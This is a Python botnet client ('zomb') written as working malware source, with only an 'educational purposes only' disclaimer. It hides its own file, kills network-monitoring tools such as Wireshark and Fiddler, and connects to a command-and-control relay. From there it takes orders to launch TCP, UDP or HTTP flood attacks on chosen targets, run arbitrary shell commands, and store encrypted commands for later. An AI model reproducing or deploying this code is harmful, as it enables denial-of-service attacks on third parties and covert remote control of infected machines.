import socket
from threading import Thread
from time import sleep, time
from os import system, path as ospath
import requests
from speedtest import Speedtest
from json import load
from cryptography.fernet import Fernet
from random import uniform, choice, randint, random
from requests import get as rget
from tempfile import gettempdir
from sys import argv
from ctypes import windll
from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess



__filename__="zomb"
__version__="2.0"
__author__="4lxprime"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."



# Configuration
RELAY_PORT=5000
api_url="http://localhost/phybot/api/v2"
urlkey="VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
raddr=[]
base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]
pl="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # 100 * 1oct request
plb=150*pl
key="b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
stu=[]
try:
    speed=[0]
    Speedtest()
    stu.append(True)
except:
    speed=[0]
    stu.append(False)
enckey="BkpVa0VQa4iXquxMtbWKHDKdyjWmZ6BGb7AM94ED_go="
ogkey=[]
ngkey=[]
f=Fernet(enckey)
enckeyD="kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
fer=Fernet(enckeyD)



def hide():
    windll.kernel32.SetFileAttributesW(argv[0], 2)



def cryptD(msg: str, encde=True):
    if encde:
        msg=fer.encrypt(msg)
    else: 
        msg=fer.decrypt(msg)
    return msg

def crypt(msg: str, encde=True):
    if encde:
        msg=f.encrypt(msg)
    else: 
        msg=f.decrypt(msg)
    return msg



def rand_ua():
    return choice(base_user_agents) % (random() + 5, random() + randint(1, 8), random(), randint(2000, 2100), randint(92215, 99999), (random() + randint(3, 9)), random())



def dos(s, attack: tuple, tps: int, method: str): # start dos attack with socket and attack target
    tps=tps
    tps=round(time())+int(tps) # set the attack time with time() + attack time
    if method=="TCP":
        print("TCP")
        while time() < tps:
            try:
                s.connect(attack)
                while time() < tps:
                    s.send(bytes(plb, "utf-8"))
            except:
                pass
            
    elif method=="UDP":
        print("UDP")
        while time() < tps:
            try:
                s.sendto(bytes(plb, "utf-8"), attack)
            except:
                pass
            
    elif method=="HTTP":
        while time() < tps:
            try:
                s.connect(attack)
                while time() < tps:
                    s.send(f'GET / HTTP/1.1\r\nHost: {attack[0]}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
            except:
                s.close()
                
    else:
        print("Unknown")
        while time() < tps:
            try:
                s.sendto(bytes(plb, "utf-8"), attack)
            except:
                pass
            
    print("End")
    return 0


def st():
    
    if len(stu)>=1:
        while len(stu)!=0:
            for i in stu:
                stu.remove(i)
                
    try:
        Speedtest()
        stu.append(True)
    except:
        stu.append(False)


def _stu():
    while 1:
        for i in stu:
            if i==False:
                pass
            elif i:
                nt=Speedtest()
                nb=nt.upload()
                nb=round(nb/8000, 3)
                if sum(speed)!=0:
                    for i in speed:
                        speed.remove(i)
                    speed.append(nb)
                elif sum(speed)==0:
                    speed.append(nb)
                print(sum(speed))
                sleep(160)



def getkey():
    while 1:
        for i in raddr:
            url=f"{api_url}/gkey.php?urlkey={urlkey}&rip={i}"
            r=requests.get(url).json()
            if r!="error":
                while ngkey!=[]:
                    for i in ngkey:
                        ngkey.remove(i)
                ngkey.append(r)
            else:
                print("error")
        sleep(600)



def main():
    c2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            RELAY_ADDR=rget(f"{api_url}/dispatch.php?urlkey={urlkey}").json()
            while raddr!=[]:
                for i in raddr:
                    raddr.remove(i)
            raddr.append(RELAY_ADDR)
            print(RELAY_ADDR)
            c2.connect((RELAY_ADDR, RELAY_PORT))
            print((RELAY_ADDR, RELAY_PORT))

            while 1:
                data=c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    print("send bot")
                    break

            while 1:
                data=c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    print("send \xff\xff\xff\xff\75")
                    break
            break
        except:
            sleep(240)

    while 1:
        try:
            data = c2.recv(1024).decode()
            if not data:
                break
            print(data)
            if data.startswith("b'gAAA"):
                try:
                    data=data.replace("b'gAAA", "gAAA").replace("'", "").encode()
                    data=fer.decrypt(data).decode()
                except Exception as e:
                    print(e)
            elif data.startswith("GK"):
                data=data.replace("GK", "")
                if len(ngkey)!=0:
                    f=Fernet(ngkey)
                    data=f.decrypt(data.encode()).decode()
                    if data.startswith("GKEY"):
                        data=data.replace("GKEY:[", "").replace("]", "")
                        while ogkey!=[]:
                            for i in ogkey:
                                ogkey.remove(i)
                        for i in ngkey:
                            ogkey.append(i)
                        while ngkey!=[]:
                            for i in ngkey:
                                ngkey.remove(i)
                        ngkey.append(data)
                else:
                    data=fer.decrypt(data.encode()).decode()
                    if data.startswith("GKEY"):
                        data=data.replace("GKEY:[", "").replace("]", "")
                        while ngkey!=[]:
                            for i in ngkey:
                                ngkey.remove(i)
                        ngkey.append(data)
                    
            else:
                pass
            

            args = data.split(' ')
            command = args[0].upper()

            if command=="ATTACK":
                print("ATTACK")
                arg=data
                print(arg)
                arg=arg.replace("ATTACK ", "")
                if arg.endswith("UPD"):
                    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                                      # UDP conn
                    method="UDP"
                elif arg.endswith("TCP"): 
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                   # TCP conn
                    method="TCP"
                elif arg.endswith("HTTP"): 
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                                        # UDP conn 
                    method="HTTP"
                else:
                    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dp=arg.find(":")                                                                                                                # find separator (127.0.0.1:8080)
                attackIP=arg[0:dp]                                                                                                              # target ip
                attackP=arg[dp:arg.find("/")]                                                                                                   # target port
                attackP=str(attackP).replace(":","")
                attackP=int(attackP)
                attack=attackIP, attackP                                                                                                        # all the target infos
                tps=arg[arg.find("/"):arg.find("-")]                                                                                            # get attack time
                tps=str(tps).replace("/", "")
                Thread(target=dos, args=(s, attack, tps, method)).start()

            elif command == 'PING':
                print("PONG")
                c2.send(f'PONG[p:{key}]'.encode())

            elif command=='NETSPEED':
                print("NETSPEED")
                c2.send(str(round(sum(speed))).encode())
            
            elif command=='CMD':
                print("CMD")
                cmd=data
                cmd=cmd.replace("CMD ", "")
                system(cmd)
                
            elif command=="METHOD":
                print('METHOD')
                if ospath.exists(f"{gettempdir()}\method.json"):
                    pass
                else:
                    with open(f"{gettempdir()}\method.json", "w") as f:
                        f.write("{}")
                args=data.replace("METHOD ", "")
                arg=args.split(" ")
                print(arg)
                if arg[0]=='CREATE':
                    name=arg[1]
                    cmd=args.replace("CREATE ", "").replace(f"{name} ", "")
                    cmd=crypt(cmd.encode())
                    print(cmd)
                    print(name)
                    name="'"+name+"'"
                    with open(f"{gettempdir()}\method.json", "r") as f:
                        tb1=load(f)
                        tb1=str(tb1).replace('{"', '"').replace("{}", "")
                        tb1=str(tb1).replace("}    ", "")
                        tb="""""" + str(name) + """: {
    "name": """ + str(name) + """,
    "command": """ + str(cmd) + """
}"""
                    if not tb1 == None:
                        tb="{"+tb1+",\n"+tb+"\n}    "
                    else:
                        tb="{"+tb+"\n}    "
                    tb=tb.replace("{{", "{").replace("}}", "}")
                    with open(f"{gettempdir()}\method.json", "w") as f:
                        f.write(tb.replace("'", '"').replace("{,", "{").replace('b"', '"'))
                
                            
                else:
                    name=arg[0]
                    with open(f"{gettempdir()}\method.json", "r") as f:
                        tb=load(f)[name]["command"]
                        cmd=crypt(tb.encode(), False).decode()
                        print(cmd)
                        system(cmd)
                
                
            elif data=="METHOD CLEAR":
                with open(f"{gettempdir()}\method.json", "w") as f:
                    f.write("{}")

        except:
            break

    c2.close()

    main()


class p2pnet():
    def __init__(self):
        self.port=3630
        self.main()
    
    def handle_client(self, client, address):
        while 1:
            data=client.recv(1024).decode().strip()
            if not data:
                continue
            break
        
        try:
            data=dict(data)
            f=Fernet(ngkey)
            p2p=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if data['enc']!={}:
                data['target']['data']=f.encrypt(str(data['target']['data']).encode()).decode()
                for i in dict(data["enc"]):
                    p2p.connect((i['ip'], 3630))
                    data=dict(data["enc"]).pop(i)
                    p2p.send(str(data).encode())
            elif data['dec']!={}:
                data['target']['data']=f.decrypt(str(data['target']['data']).encode()).decode()
                for i in dict(data["dec"]):
                    p2p.connect((i['ip'], 3630))
                    data=dict(data["dec"]).pop(i)
                    p2p.send(str(data).encode())
            else:
                data['target']['data']=f.decrypt(str(data['target']['data']).encode()).decode()
                for i in dict(data["target"]):
                    p2p.connect((i['ip'], i['port']))
                    p2p.send(i['data'].encode())
        except:
            client.close()
        
    def main(self):
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            sock.bind(('0.0.0.0', self.port))
        except:
            return 0

        sock.listen()

        while 1:
            Thread(target=self.handle_client, args=[*sock.accept()]).start()


class netblock:
    def net(names):
        for proc in process_iter():
            try:
                for name in names:
                    if name.lower() in proc.name().lower():
                        proc.kill()
            except (NoSuchProcess, AccessDenied, ZombieProcess):
                pass
    def block():
        forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
        return netblock.net(names=forbidden)
    
netblock.block()



if __name__ == '__main__':
    try:
        print(f"\nLegit: {__legit__}\n")
        Thread(target=_stu).start()
        Thread(target=st).start()
        Thread(target=getkey).start()
        Thread(target=p2pnet).start()
        hide()
        main()
    except:
        pass